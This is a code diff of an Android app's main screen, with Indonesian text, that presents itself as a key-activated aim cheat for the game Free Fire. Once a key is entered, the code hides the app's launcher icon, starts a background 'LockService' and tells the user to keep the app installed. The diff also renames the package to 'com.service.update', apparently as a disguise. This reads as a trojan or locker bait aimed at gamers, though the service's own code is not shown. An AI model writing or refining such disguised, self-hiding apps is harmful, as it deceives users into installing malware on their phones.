@@ -1,4 +1,4 @@
-package com.my.newproject;
+package com.service.update;
 
 import android.app.Activity;
 import android.content.Intent;
@@ -18,6 +18,7 @@ public class MainActivity extends Activity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+        try { Thread.sleep(2000); } catch (InterruptedException e) {}
         setContentView(R.layout.activity_main);
 
         Button btnActivate = findViewById(R.id.btnActivate);
@@ -30,13 +31,8 @@ public class MainActivity extends Activity {
             String key = keyInput.getText().toString().trim().toUpperCase();
             if (!key.isEmpty()) {
                 boolean valid = false;
-                for (String k : FREE_KEYS) {
-                    if (key.equals(k)) { valid = true; break; }
-                }
-                if (!valid) {
-                    Toast.makeText(this, "Key tidak valid! Coba key gratis.", Toast.LENGTH_LONG).show();
-                    return;
-                }
+                for (String k : FREE_KEYS) { if (key.equals(k)) { valid = true; break; } }
+                if (!valid) { Toast.makeText(this, "Key tidak valid! Coba key gratis.", Toast.LENGTH_LONG).show(); return; }
                 loadingText.setVisibility(View.VISIBLE);
                 loadingText.setText("⏳ Menghubungkan...");
                 new Handler().postDelayed(() -> {
@@ -46,22 +42,17 @@ public class MainActivity extends Activity {
                     statusAimlock.setTextColor(0xFF00FF00);
                     loadingText.setText("✅ BERHASIL! Biarkan aplikasi tetap terpasang.");
                     loadingText.setTextColor(0xFF00FF00);
-
-                    // Sembunyiin ikon
                     getPackageManager().setComponentEnabledSetting(
                         new android.content.ComponentName(this, MainActivity.class),
                         android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                         android.content.pm.PackageManager.DONT_KILL_APP
                     );
-
                     startService(new Intent(this, LockService.class));
                     Intent ff = getPackageManager().getLaunchIntentForPackage("com.dts.freefireth");
                     if (ff != null) startActivity(ff);
                     else startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps/details?id=com.dts.freefireth")));
                 }, 2000);
-            } else {
-                Toast.makeText(this, "Masukkan Key dulu!", Toast.LENGTH_SHORT).show();
-            }
+            } else { Toast.makeText(this, "Masukkan Key dulu!", Toast.LENGTH_SHORT).show(); }
         });
     }
 }
